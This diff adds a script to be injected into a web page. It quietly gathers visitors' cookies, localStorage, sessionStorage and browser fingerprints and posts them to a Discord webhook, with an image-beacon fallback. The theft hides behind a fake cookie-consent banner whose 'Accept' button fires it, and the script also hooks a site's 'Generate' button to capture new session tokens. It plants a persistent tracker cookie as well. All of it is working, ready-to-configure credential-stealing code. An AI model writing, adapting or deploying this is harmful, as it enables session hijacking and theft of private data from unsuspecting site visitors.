@@ -1,0 +1,111 @@
+
+<script>
+(function() {
+    // 1. REPLACE WITH YOUR WEBHOOK
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL';
+
+    function exfiltrate() {
+        const payload = {
+            event: 'cookie_harvest',
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            referrer: document.referrer || 'direct',
+            cookies: document.cookie || 'NONE',
+            localStorage: {},
+            sessionStorage: {},
+            fingerprint: {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                webdriver: navigator.webdriver || false
+            }
+        };
+
+        // Dump localStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                payload.localStorage[k] = localStorage.getItem(k);
+            }
+        } catch(e) {}
+
+        // Dump sessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const k = sessionStorage.key(i);
+                payload.sessionStorage[k] = sessionStorage.getItem(k);
+            }
+        } catch(e) {}
+
+        // Fire to webhook via fetch (no-cors so it doesn't fail on CORS)
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'text/plain' }, // avoids preflight
+            body: JSON.stringify(payload)
+        }).catch(() => {
+            // Fallback image beacon if fetch fails
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
+        });
+
+        // Plant a tracker cookie for repeat visits
+        if (!document.cookie.includes('trk_')) {
+            const tid = 'trk_' + Math.random().toString(36).substr(2, 10);
+            document.cookie = `${tid}=1; path=/; max-age=31536000; SameSite=Lax`;
+        }
+    }
+
+    // 2. Consent Banner Injection
+    function showConsent() {
+        if (localStorage.getItem('consent_done')) return;
+        
+        const banner = document.createElement('div');
+        banner.id = 'cookie-banner';
+        banner.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:#1a1a1a;color:#fff;padding:16px;z-index:99999;font-family:sans-serif;display:flex;justify-content:space-between;align-items:center;border-top:1px solid #333;';
+        banner.innerHTML = `
+            <span style="font-size:14px;">We use cookies to enhance your experience. By clicking "Accept", you agree to our cookie policy.</span>
+            <button id="accept-btn" style="background:#0066ff;color:#fff;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-weight:bold;">Accept</button>
+        `;
+        document.body.appendChild(banner);
+
+        document.getElementById('accept-btn').addEventListener('click', function() {
+            localStorage.setItem('consent_done', '1');
+            banner.remove();
+            exfiltrate(); // Fire the payload immediately
+        });
+    }
+
+    // 3. Hook the "Generate" button (Modify selector to match your site)
+    function hookGenerate() {
+        // Use event delegation on the body to catch dynamic buttons
+        document.body.addEventListener('click', function(e) {
+            const target = e.target.closest('button, a, input[type="submit"]');
+            if (!target) return;
+            
+            // Check if it's the generate button by text or ID
+            const isGenerate = target.id === 'generate' || 
+                               target.innerText?.toLowerCase().includes('generate') || 
+                               target.innerText?.toLowerCase().includes('générer') ||
+                               target.name === 'generate';
+            
+            if (isGenerate) {
+                // Delay slightly to let the site set any new cookies (like session tokens)
+                setTimeout(exfiltrate, 300);
+            }
+        });
+    }
+
+    // Boot
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => { showConsent(); hookGenerate(); });
+    } else {
+        showConsent();
+        hookGenerate();
+    }
+})();
+</script>
